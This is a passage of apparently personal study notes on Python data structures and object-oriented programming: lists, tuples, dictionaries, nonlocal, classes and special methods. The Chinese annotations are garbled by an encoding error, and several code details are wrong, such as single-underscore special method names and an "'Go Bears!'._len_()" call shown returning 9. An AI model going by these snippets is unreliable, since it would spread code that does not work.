trees.</p><p>The <code>type</code> function:</p><figure class="highlight elm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs elm"><span class="hljs-title">if</span> <span class="hljs-keyword">type</span>(tree) != list or len(tree) &lt; 1:<br>          return <span class="hljs-type">False</span><br></code></pre></td></tr></table></figure><p><code>tree</code> æ˜¯ nested list, ç¬¬ä¸€ä¸ªå…ƒç´ ä¸º root&#x2F;label, åé¢çš„ä¸º branches.<br><mark>Patition trees</mark>, </p><h3 id="2-3-7-Linked-Lists"><a href="#2-3-7-Linked-Lists" class="headerlink" title="2.3.7 Linked Lists"></a>2.3.7 Linked Lists</h3><p>A linked list is a pair containing the first element of the sequence and the rest of the sequence. The second element is also a linked list.</p><p>Linked list have recursive structure: the rest of a linked list is a linked list or â€˜emptyâ€™. è¿™ä¸ª â€˜emptyâ€™ æ˜¯å­—ç¬¦ä¸² â€˜emptyâ€™.</p><h2 id="2-4-Mutable-Data"><a href="#2-4-Mutable-Data" class="headerlink" title="2.4 Mutable Data"></a>2.4 Mutable Data</h2><p>One powerful technique for creating modular programs is to incorporate data that may change state over time.</p><p>Adding state to data is a central ingredient of a paradigm called object-oriented programming.</p><h3 id="2-4-1-The-Object-Metaphor"><a href="#2-4-1-The-Object-Metaphor" class="headerlink" title="2.4.1 The Object Metaphor"></a>2.4.1 The Object Metaphor</h3><p>The distinguish between functions and data: functions performed operations and data were operated upon.</p><p>Objects combine data values with behavior.</p><p>A class represents a kind of value. Individual dates are called instances of that class.</p><p>Objects have <mark>attributes</mark>, which are named values that are part of the object. We use dot notation to designated an attribute of an object.</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">expression</span>&gt;</span>.<span class="hljs-tag">&lt;<span class="hljs-name">name</span>&gt;</span><br></code></pre></td></tr></table></figure><p>Objects also have <mark>methods</mark>, which are function-valued attributes.</p><p>In fact, all values in Python are objects. That is, all values have behavior and attributes. They act like the values they represent.</p><h3 id="2-4-2-Sequence-Objects"><a href="#2-4-2-Sequence-Objects" class="headerlink" title="2.4.2 Sequence Objects"></a>2.4.2 Sequence Objects</h3><p>Instances of primitive built-in values such as numbers are immutable. The values themsleves cannot change over the course of program execution.</p><p>Mutable objects are used to represent values that change over time.</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">  &gt;</span><span class="language-bash">&gt;&gt; suits.pop()             <span class="hljs-comment"># Remove and return the final element</span></span><br>&#x27;myriad&#x27;<br><span class="hljs-meta prompt_">  &gt;</span><span class="language-bash">&gt;&gt; suits.remove(<span class="hljs-string">&#x27;string&#x27;</span>)  <span class="hljs-comment"># Remove the first element that equals the argument</span></span><br><span class="hljs-meta prompt_">  &gt;</span><span class="language-bash">&gt;&gt; suits.append(<span class="hljs-string">&#x27;cup&#x27;</span>)              <span class="hljs-comment"># Add an element to the end</span></span><br><span class="hljs-meta prompt_">  &gt;</span><span class="language-bash">&gt;&gt; suits.extend([<span class="hljs-string">&#x27;sword&#x27;</span>, <span class="hljs-string">&#x27;club&#x27;</span>])  <span class="hljs-comment"># Add all elements of a sequence to the end</span></span><br></code></pre></td></tr></table></figure><p>å½“<code>suits = chinese</code> è¿™é‡Œ <code>suits</code> ç›¸å½“äº <code>chinese</code> è¿™ä¸ªåˆ—è¡¨çš„å¼•ç”¨, ä¿®æ”¹ <code>suits</code> ä¼šå¼•èµ· <code>chinese</code> çš„å€¼æ”¹å˜.</p><p>ä½†:</p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs abnf"><span class="hljs-attribute">suits</span> <span class="hljs-operator">=</span> list(chinese)<br></code></pre></td></tr></table></figure><p>å°±ä¸ä¼šå°†äºŒè€…è”ç³»åœ¨ä¸€èµ·.</p><figure class="highlight python-repl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python-repl"><span class="hljs-meta prompt_">&gt;&gt;&gt;</span> <span class="language-python">suits.insert(<span class="hljs-number">2</span>, <span class="hljs-string">&#x27;Joker&#x27;</span>)  <span class="hljs-comment"># Insert an element at index 2, shifting the rest</span></span><br><span class="hljs-meta prompt_">&gt;&gt;&gt;</span> <span class="language-python">nest[<span class="hljs-number">0</span>].pop(<span class="hljs-number">2</span>)</span><br>&#x27;Joker&#x27;<br></code></pre></td></tr></table></figure><p>To test whether two objects are the same, Python includes two comparison operator, called <mark>is</mark> and <mark>is not</mark>, that test whether two expressions in fact evaluate to the identical object.</p><p>Two onjects are identical if they are equal in their current value, and any change to one will always be reflected in the other.</p><p>åŒºåˆ† <code>==</code> å’Œ <code>is</code>.</p><p><mark>Tuples</mark><br>An instance of the built-in <code>tuple</code> type, is an immutable sequence. ä½¿ç”¨ parentheses.</p><p>tupleä¹Ÿæ˜¯ finite length and support element selection:</p><figure class="highlight python-repl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs python-repl"><span class="hljs-meta prompt_">&gt;&gt;&gt;</span> <span class="language-python">code = (<span class="hljs-string">&quot;up&quot;</span>, <span class="hljs-string">&quot;up&quot;</span>, <span class="hljs-string">&quot;down&quot;</span>, <span class="hljs-string">&quot;down&quot;</span>) + (<span class="hljs-string">&quot;left&quot;</span>, <span class="hljs-string">&quot;right&quot;</span>) * <span class="hljs-number">2</span></span><br><span class="hljs-meta prompt_">&gt;&gt;&gt;</span> <span class="language-python"><span class="hljs-built_in">len</span>(code)</span><br>8<br><span class="hljs-meta prompt_">&gt;&gt;&gt;</span> <span class="language-python">code[<span class="hljs-number">3</span>]</span><br>&#x27;down&#x27;<br><span class="hljs-meta prompt_">&gt;&gt;&gt;</span> <span class="language-python">code.count(<span class="hljs-string">&quot;down&quot;</span>)</span><br>2<br><span class="hljs-meta prompt_">&gt;&gt;&gt;</span> <span class="language-python">code.index(<span class="hljs-string">&quot;left&quot;</span>)</span><br>4<br></code></pre></td></tr></table></figure><p>While it is not possible to change which elements are in a tuple, it is possible to change the value of a mutable element contained within a tuple.</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs stylus">nest = (<span class="hljs-number">10</span>, <span class="hljs-number">20</span>, <span class="hljs-selector-attr">[30, 40]</span>)<br><span class="hljs-number">2</span>nest<span class="hljs-selector-attr">[2]</span><span class="hljs-selector-class">.pop</span>()<br></code></pre></td></tr></table></figure><h3 id="2-4-3-Dictionaries"><a href="#2-4-3-Dictionaries" class="headerlink" title="2.4.3 Dictionaries"></a>2.4.3 Dictionaries</h3><p>A dictionary contains key-value pairs, where both keys and values are objects.</p><p>The purpose of a dictionary is  to provide an abstraction for storing and retrieving values that are indexed not by consecutive integers, but by descriptive keys.</p><p>Adding new key-value pairs and changing the existing value for a key can both be achieved with assignment statements:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-meta">&gt;&gt;&gt; </span>numerals[<span class="hljs-string">&#x27;I&#x27;</span>] = <span class="hljs-number">1</span><br><span class="hljs-meta">&gt;&gt;&gt; </span>numerals[<span class="hljs-string">&#x27;L&#x27;</span>] = <span class="hljs-number">50</span><br><span class="hljs-meta">&gt;&gt;&gt; </span>numerals<br>&#123;<span class="hljs-string">&#x27;I&#x27;</span>: <span class="hljs-number">1</span>, <span class="hljs-string">&#x27;X&#x27;</span>: <span class="hljs-number">10</span>, <span class="hljs-string">&#x27;L&#x27;</span>: <span class="hljs-number">50</span>, <span class="hljs-string">&#x27;V&#x27;</span>: <span class="hljs-number">5</span>&#125;<br></code></pre></td></tr></table></figure><p>Dictionaries are unordered collections of key-value pairs.</p><p>The methods <code>keys</code>, <code>values</code>, and <code>items</code> all return iterable values.</p><p>A list of key-value pairs can be converted into a dictionary by calling the <code>dict</code> constructor function:</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs javascript">&gt;&gt;&gt; <span class="hljs-title function_">dict</span>(<span class="hljs-params">[(<span class="hljs-number">3</span>, <span class="hljs-number">9</span>), (<span class="hljs-number">4</span>, <span class="hljs-number">16</span>), (<span class="hljs-number">5</span>, <span class="hljs-number">25</span>)]</span>)<br>&#123;<span class="hljs-number">3</span>: <span class="hljs-number">9</span>, <span class="hljs-number">4</span>: <span class="hljs-number">16</span>, <span class="hljs-number">5</span>: <span class="hljs-number">25</span>&#125;<br></code></pre></td></tr></table></figure><p>Restrictions:</p><ul><li>A key of a dictionary cannot be or contain a mutable value.</li><li>There can be at most one value for a given key.</li></ul><p>A  useful method implemented by dictionaries is get, which returns either the value for a key, if the key is present, or a default value. The arguments to get are the key and the default value.</p><figure class="highlight python-repl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python-repl"><span class="hljs-meta prompt_">&gt;&gt;&gt;</span> <span class="language-python">numerals.get(<span class="hljs-string">&#x27;A&#x27;</span>, <span class="hljs-number">0</span>)</span><br>0<br><span class="hljs-meta prompt_">&gt;&gt;&gt;</span> <span class="language-python">numerals.get(<span class="hljs-string">&#x27;V&#x27;</span>, <span class="hljs-number">0</span>)</span><br>5<br></code></pre></td></tr></table></figure><p>Dictionaries also have a comprehension syntax analogous to those of lists. A key expression and a value expression are separated by a colon. Evaluating a dictionary comprehension creates a new dictionary object.</p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs llvm">&gt;&gt;&gt; &#123;<span class="hljs-keyword">x</span>: <span class="hljs-keyword">x</span>*<span class="hljs-keyword">x</span> for <span class="hljs-keyword">x</span> in range(<span class="hljs-number">3</span><span class="hljs-punctuation">,</span><span class="hljs-number">6</span>)&#125;<br>&#123;<span class="hljs-number">3</span>: <span class="hljs-number">9</span><span class="hljs-punctuation">,</span> <span class="hljs-number">4</span>: <span class="hljs-number">16</span><span class="hljs-punctuation">,</span> <span class="hljs-number">5</span>: <span class="hljs-number">25</span>&#125;<br></code></pre></td></tr></table></figure><h3 id="2-4-4-Local-State"><a href="#2-4-4-Local-State" class="headerlink" title="2.4.4 Local State"></a>2.4.4 Local State</h3><p>Lists and dictionaries have local state: they are changing values that have some particular contents at any point in the execution of a program.</p><p>The <code>nonlocal</code> statement indicates that the name appears somewhere in the environment other than the first(local) frame or the last(global) frame. ä¹Ÿå°±æ˜¯è¯´, å‡å¦‚æœ‰ä¸ª<code>test</code>å˜é‡åœ¨è¿™ä¸ªå‡½æ•°ä¹‹å¤–å·²ç»è¢«å®šä¹‰äº†, ç„¶è€Œè¦åœ¨è¿™ä¸ªå‡½æ•°é‡Œé¢ä¿®æ”¹è¿™ä¸ª<code>test</code>çš„å€¼, å¦‚æœ<code>nonlocal test</code>, é‚£ä¹ˆè¿™ä¸ª<code>test</code>å°±ä¸æ˜¯å‡½æ•°é‡Œé¢çš„å±€éƒ¨å˜é‡,è€Œæ˜¯å¤–é¢é‚£ä¸ª.</p><p><code>nonlocal</code>ç”¨äºå£°æ˜å¤–éƒ¨å‡½æ•°çš„å±€éƒ¨å˜é‡.</p><p>high-order function, å°±æ˜¯æŠŠéœ€è¦å¤šä¸ªå‚æ•°çš„ä¸€ä¸ªå‡½æ•°æ‹†åˆ†ä¸º, æ¯æ¬¡åªéœ€è¦ä¸€ä¸ªå‚æ•°çš„è¿­ä»£å‡½æ•°.</p><p>Assignment has a dual role: they either created new bindings or re-bound existing names.</p><p>Python has an unusual restriction regarding the lookup of names: within the body of a function, all instances of a name must refer to the same frame.</p><p>Adding a <code>nonlocal</code> statement can correct the <code>UnboundLocalError: local variable &#39;balance&#39; referenced before assignment</code> error.</p><h3 id="2-4-5-The-Benefits-of-Non-Local-Assignment"><a href="#2-4-5-The-Benefits-of-Non-Local-Assignment" class="headerlink" title="2.4.5 The Benefits of Non-Local Assignment"></a>2.4.5 The Benefits of Non-Local Assignment</h3><h3 id="2-4-6-The-Cost-of-Non-Local-Assignment"><a href="#2-4-6-The-Cost-of-Non-Local-Assignment" class="headerlink" title="2.4.6 The Cost of Non-Local Assignment"></a>2.4.6 The Cost of Non-Local Assignment</h3><p>Our values did not change, only our names and bindings changed.</p><p>We must be very careful to understand the effect of a change on other names that might refer to thos  values.</p><p><mark>Only function calls</mark> can introduce new frames.</p><h3 id="2-4-7-Implementing-Lists-and-Dictionaries"><a href="#2-4-7-Implementing-Lists-and-Dictionaries" class="headerlink" title="2.4.7 Implementing Lists and Dictionaries"></a>2.4.7 Implementing Lists and Dictionaries</h3><p>Two empty lists are not identical values.</p><p>A general pattern in programming: the function is a dispatch function and its arguments are first a message, followed by additional arguments to parameterize that method.</p><p><mark>Linked list</mark>, æ˜¯é“¾è¡¨.</p><h3 id="2-4-9-Propagating-Constraints"><a href="#2-4-9-Propagating-Constraints" class="headerlink" title="2.4.9 Propagating Constraints"></a>2.4.9 Propagating Constraints</h3><p>Mutable data allows us to simulate systems with change, but also allows us to build new kinds of abstractions.</p><p>A <mark>connector</mark> is an object that â€œholdsâ€ a value and may participate in one or more constraints. </p><h2 id="2-5-Object-Oriented-Programming"><a href="#2-5-Object-Oriented-Programming" class="headerlink" title="2.5 Object-Oriented Programming"></a>2.5 Object-Oriented Programming</h2><p>Objects have local state that is not directly accessible from the global environment.</p><p>Each objects bundles together local state and behavior in a way that abstracts the complexity of both.</p><p>Every object also has a type, called its <code>class</code>.</p><h3 id="2-5-1-Objects-and-Classes"><a href="#2-5-1-Objects-and-Classes" class="headerlink" title="2.5.1 Objects and Classes"></a>2.5.1 Objects and Classes</h3><p>A class serves as a template for all objects whose type is that class.</p><p>Every object is an instance of some particular class.</p><p>The syntax in Python for instantiating a class is identical to the syntax of calling a function:</p><figure class="highlight isbl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs isbl">&gt;&gt;&gt; <span class="hljs-variable">a</span> = <span class="hljs-function"><span class="hljs-title">Account</span>(<span class="hljs-string">&#x27;Kirk&#x27;</span>)</span><br></code></pre></td></tr></table></figure><p>The attributes specific tot a particular object, as opposed to all objects of a class, are called <mark>instance attributes</mark>. Instance attributes may also be called field, properties, or instance variable.</p><p>Functions that operate on the object or perform object-specific computations are called <mark>methods</mark>. Methods are invoked on a particular object.</p><h3 id="2-5-2-Defining-Classes"><a href="#2-5-2-Defining-Classes" class="headerlink" title="2.5.2 Defining Classes"></a>2.5.2 Defining Classes</h3><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs angelscript"><span class="hljs-keyword">class</span> &lt;<span class="hljs-symbol">name</span>&gt;:<br>    &lt;<span class="hljs-symbol">suite</span>&gt;<br></code></pre></td></tr></table></figure><p>The method that initializes objects has a special name in Python, <code>_init_</code>, and is called the <em>constructor</em> for the class.</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs ruby">&gt;&gt;&gt; <span class="hljs-keyword">class</span> <span class="hljs-title class_">Account</span>:<br>      <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params"><span class="hljs-variable language_">self</span>, account_holder</span>):<br>          <span class="hljs-variable language_">self</span>.balance = <span class="hljs-number">0</span><br>          <span class="hljs-variable language_">self</span>.holder = account_holder<br></code></pre></td></tr></table></figure><p>ç¬¬ä¸€ä¸ª<code>self</code>å‚æ•°æ˜¯ bound to the newly created object. ä½¿ç”¨<code>self</code>æ˜¯ä¸€ä¸ª convention.</p><p>ç¬¬äºŒä¸ªå‚æ•°æ˜¯æˆ‘ä»¬ä¼ å…¥çš„.</p><p>Object identity is compared using the <code>is</code> and <code>is not</code> operators.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-meta">&gt;&gt;&gt; </span>a <span class="hljs-keyword">is</span> a<br><span class="hljs-literal">True</span><br><span class="hljs-meta">&gt;&gt;&gt; </span>a <span class="hljs-keyword">is</span> <span class="hljs-keyword">not</span> b<br><span class="hljs-literal">True</span><br></code></pre></td></tr></table></figure><p>Binding an object to a new name using assignment does not create a new object:</p><figure class="highlight python-repl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python-repl"><span class="hljs-meta prompt_">&gt;&gt;&gt;</span> <span class="language-python">c = a</span><br><span class="hljs-meta prompt_">&gt;&gt;&gt;</span> <span class="language-python">c <span class="hljs-keyword">is</span> a</span><br>True<br></code></pre></td></tr></table></figure><p>Methodsâ€™definition:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-meta">&gt;&gt;&gt; </span><span class="hljs-keyword">class</span> <span class="hljs-title class_">Account</span>:<br>      <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self, account_holder</span>):<br>          self.balance = <span class="hljs-number">0</span><br>          self.holder = account_holder<br>      <span class="hljs-keyword">def</span> <span class="hljs-title function_">deposit</span>(<span class="hljs-params">self, amount</span>):<br>          self.balance = self.balance + amount<br>          <span class="hljs-keyword">return</span> self.balance<br>      <span class="hljs-keyword">def</span> <span class="hljs-title function_">withdraw</span>(<span class="hljs-params">self, amount</span>):<br>          <span class="hljs-keyword">if</span> amount &gt; self.balance:<br>              <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;Insufficient funds&#x27;</span><br>          self.balance = self.balance - amount<br>          <span class="hljs-keyword">return</span> self.balance<br></code></pre></td></tr></table></figure><p>æ³¨æ„éƒ½æœ‰<code>self</code> å‚æ•°.</p><h3 id="2-5-3-Message-Passing-and-Dot-Expressions"><a href="#2-5-3-Message-Passing-and-Dot-Expressions" class="headerlink" title="2.5.3 Message Passing and Dot Expressions"></a>2.5.3 Message Passing and Dot Expressions</h3><p>Dot notation is a syntactic feature of Python that formalizes the message passing metaphor.</p><p><em>Dot expression</em>, consists of an expression, a dot, and a name.</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">expression</span>&gt;</span> . <span class="hljs-tag">&lt;<span class="hljs-name">name</span>&gt;</span><br></code></pre></td></tr></table></figure><p>The built-in function <code>getattr</code> will return an attribute for an object by name:</p><figure class="highlight python-repl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python-repl"><span class="hljs-meta prompt_">&gt;&gt;&gt;</span> <span class="language-python"><span class="hljs-built_in">getattr</span>(spock_account, <span class="hljs-string">&#x27;balance&#x27;</span>)</span><br>10<br></code></pre></td></tr></table></figure><p>To test whether an object has a named attribute with <code>hasattr</code>:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-meta">&gt;&gt;&gt; </span><span class="hljs-built_in">hasattr</span>(spock_account, <span class="hljs-string">&#x27;deposit&#x27;</span>)<br><span class="hljs-literal">True</span><br></code></pre></td></tr></table></figure><p><em>Methods and function</em>. WWhen a method is invoked on an object, that object is implicitly passed as the first argument to the method. As a result, the object is bound to the parameter <code>self</code>.</p><p>We can call <code>deposit</code>(example in the text) in two ways: as a function and as a bound method.</p><figure class="highlight python-repl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python-repl"><span class="hljs-meta prompt_">&gt;&gt;&gt;</span> <span class="language-python">Account.deposit(spock_account, <span class="hljs-number">1001</span>)  <span class="hljs-comment"># The deposit function takes 2 arguments</span></span><br>1011<br><span class="hljs-meta prompt_">&gt;&gt;&gt;</span> <span class="language-python">spock_account.deposit(<span class="hljs-number">1000</span>)           <span class="hljs-comment"># The deposit method takes 1 argument</span></span><br>2011<br></code></pre></td></tr></table></figure><p>ä¹Ÿå°±æ˜¯è¯´, ä½¿ç”¨ dot operator æ˜¯è‡ªåŠ¨ä¼ å…¥<code>self</code>å‚æ•°.</p><p><em>Naming Conventions</em>, é¦–å­—æ¯å¤§å†™.</p><p>Pythonâ€™s convention dictates that if an attribute name starts with an underscore, it should only be accessed within methods of the class itself, rather than by users of the class.</p><h3 id="2-5-4-Class-Attributes"><a href="#2-5-4-Class-Attributes" class="headerlink" title="2.5.4 Class Attributes"></a>2.5.4 Class Attributes</h3><p>Some attribute values are shared across all objects of a given class. Such attributes are associated with the class itself, rather than any individual instance of the class. ä¹Ÿå°±æ˜¯è¯´è¿™ä¸ª attribute æ˜¯å’Œæ•´ä¸ª class å…³è”åœ¨ä¸€èµ·çš„. ä½¿ç”¨classæ”¹å˜. <mark>class attributes</mark> may also be called class variables or static variables.</p><figure class="highlight python-repl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python-repl"><span class="hljs-meta prompt_">&gt;&gt;&gt;</span> <span class="language-python">Account.interest = <span class="hljs-number">0.05</span>  <span class="hljs-comment"># changing the class attribute</span></span><br><span class="hljs-meta prompt_">&gt;&gt;&gt;</span> <span class="language-python">spock_account.interest     <span class="hljs-comment"># changes instances without like-named instance attributes</span></span><br>0.05<br><span class="hljs-meta prompt_">&gt;&gt;&gt;</span> <span class="language-python">kirk_account.interest     <span class="hljs-comment"># but the existing instance attribute is unaffected</span></span><br>0.08<br></code></pre></td></tr></table></figure><p>åˆ†æœ‰ class attribute å’Œ instance attribute.</p><p>Instance attributes are found before class attributes, just as local names have priority over global in an environment.</p><h3 id="2-5-5-Inheritance"><a href="#2-5-5-Inheritance" class="headerlink" title="2.5.5 Inheritance"></a>2.5.5 Inheritance</h3><p>Two classes may have similar attributes, but one represents a special case of the othor.</p><p>The terms <mark>parent class</mark> and superclass are also used for the base class, while <mark>child class</mark> is also used for the subclass.</p><h3 id="2-5-6-Using-Inheritance"><a href="#2-5-6-Using-Inheritance" class="headerlink" title="2.5.6 Using Inheritance"></a>2.5.6 Using Inheritance</h3><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs angelscript">&gt;&gt;&gt; <span class="hljs-keyword">class</span> <span class="hljs-symbol">CheckingAccount</span>(<span class="hljs-symbol">Account</span>):<br></code></pre></td></tr></table></figure><p>Placing an expression that evaluates to the base class in parentheses after the class name. subclass å¯ä»¥è¦†ç›– superclass çš„ attributes.</p><p>To look up a name in a class:</p><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver"><span class="hljs-number">1.</span> If <span class="hljs-keyword">it</span> names <span class="hljs-keyword">an</span> attribute <span class="hljs-keyword">in</span> <span class="hljs-keyword">the</span> class, <span class="hljs-literal">return</span> <span class="hljs-keyword">the</span> attribute <span class="hljs-built_in">value</span>.<br><span class="hljs-number">2.</span> Otherwise, look up <span class="hljs-keyword">the</span> name <span class="hljs-keyword">in</span> <span class="hljs-keyword">the</span> base class, <span class="hljs-keyword">if</span> there is <span class="hljs-literal">one</span>.<br></code></pre></td></tr></table></figure><p>An <mark>object interface</mark> is a collection of attributes and conditions on those attributes.</p><h3 id="2-5-7-Multiple-Inheritance"><a href="#2-5-7-Multiple-Inheritance" class="headerlink" title="2.5.7 Multiple Inheritance"></a>2.5.7 Multiple Inheritance</h3><p>Python supports the concept of a subclass inheriting attributes from multiple base classes, a language feature called <mark>multiple inheritance</mark>. ä¹Ÿå°±æ˜¯è¯´ä»å¤šä¸ª class ä¸­ç»§æ‰¿.</p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs angelscript">&gt;&gt;&gt; <span class="hljs-keyword">class</span> <span class="hljs-symbol">AsSeenOnTVAccount</span>(<span class="hljs-symbol">CheckingAccount, <span class="hljs-symbol">SavingsAccount</span></span>):<br></code></pre></td></tr></table></figure><p>åœ¨ç»§æ‰¿å›¾ä¸­, Python resolves names from left to right, then upwards.</p><p>Python resolves this name using a recursive algorithm called the C3 Method Resolution Ordering.</p><h3 id="2-5-8-The-Role-of-Objects"><a href="#2-5-8-The-Role-of-Objects" class="headerlink" title="2.5.8 The Role of Objects"></a>2.5.8 The Role of Objects</h3><p>The Python object system is designed to make data abstraction and message passing both convenient and flexible.</p><h2 id="2-6-Implementing-Classes-and-Objects"><a href="#2-6-Implementing-Classes-and-Objects" class="headerlink" title="2.6 Implementing Classes and Objects"></a>2.6 Implementing Classes and Objects</h2><p>Programs can be object-oriented, even in programming languages that do not have a built-in object system.</p><h3 id="2-6-1-Instances"><a href="#2-6-1-Instances" class="headerlink" title="2.6.1 Instances"></a>2.6.1 Instances</h3><p>An instance has named attributes, such as the balance of an account, which can be set and retrieved.</p><h3 id="2-6-2-Classes"><a href="#2-6-2-Classes" class="headerlink" title="2.6.2 Classes"></a>2.6.2 Classes</h3><p>A class is also an object, both in Pythonâ€™s object system and the system we are implementing here.</p><p>In Python, classes do have classes, almost all classes share the same class, called <code>type</code>.</p><h2 id="2-7-Object-Abstraction"><a href="#2-7-Object-Abstraction" class="headerlink" title="2.7 Object Abstraction"></a>2.7 Object Abstraction</h2><p>A central concept in object abstraction is a <mark>generic function</mark>, which is a function that can accept values of multiple different types.</p><p>Three different techniques for implementing generic functions:</p><ul><li>shared interfaces</li><li>type dispatching</li><li>type coercion</li></ul><h3 id="2-7-1-String-Conversion"><a href="#2-7-1-String-Conversion" class="headerlink" title="2.7.1 String Conversion"></a>2.7.1 String Conversion</h3><p>Python simulates that all objects should produce two different string representations:</p><ul><li>humen-interpretable text</li><li>Python-interpretable expression<br>The constructor <code>str</code> returns a human-readable string. The <code>repr</code> function returns a Python expression that evaluates to an equal object.<figure class="highlight python-repl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python-repl"><span class="hljs-meta prompt_">&gt;&gt;&gt;</span> <span class="language-python"><span class="hljs-keyword">from</span> datetime <span class="hljs-keyword">import</span> date</span><br><span class="hljs-meta prompt_">&gt;&gt;&gt;</span> <span class="language-python">tues = date(<span class="hljs-number">2011</span>, <span class="hljs-number">9</span>, <span class="hljs-number">12</span>)</span><br><span class="hljs-meta prompt_">&gt;&gt;&gt;</span> <span class="language-python"><span class="hljs-built_in">repr</span>(tues)</span><br>&#x27;datetime.date(2011, 9, 12)&#x27;<br><span class="hljs-meta prompt_">&gt;&gt;&gt;</span> <span class="language-python"><span class="hljs-built_in">str</span>(tues)</span><br>&#x27;2011-09-12&#x27;<br></code></pre></td></tr></table></figure>The <code>repr</code> function always invokes a method called <code>_repr_</code> on its argument:<figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs 1c">&gt;&gt;&gt; tues.__repr__()<br>&#x27;datetime.date(<span class="hljs-number">2011</span>, 9, 12)&#x27;<br></code></pre></td></tr></table></figure>The <code>str</code> function always invokes a method called <code>_str_</code> on its argument:<figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs 1c">&gt;&gt;&gt; tues.__str__()<br>&#x27;<span class="hljs-number">2011-09-12</span>&#x27;<br></code></pre></td></tr></table></figure></li></ul><h3 id="2-7-2-Special-Methods"><a href="#2-7-2-Special-Methods" class="headerlink" title="2.7.2 Special Methods"></a>2.7.2 Special Methods</h3><p>In Python, certain special names are invoked by the Python interpreter in special circumstances. For example, the <code>_init_</code> method of a class is automatically invoked whenever an object is constructed.</p><p>å®šä¹‰<code>_bool_</code>æ¥åˆ¤æ–­ä¸€ä¸ªobjectçš„ true or false.</p><p>The <code>len</code> function invokes the <code>_len_</code> method of its argument to determine its length.</p><figure class="highlight python-repl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python-repl"><span class="hljs-meta prompt_">&gt;&gt;&gt;</span> <span class="language-python"><span class="hljs-string">&#x27;Go Bears!&#x27;</span>._len_()</span><br>9<br></code></pre></td></tr></table></figure><p>Python uses a sequenceâ€™s length to determine its truth value, 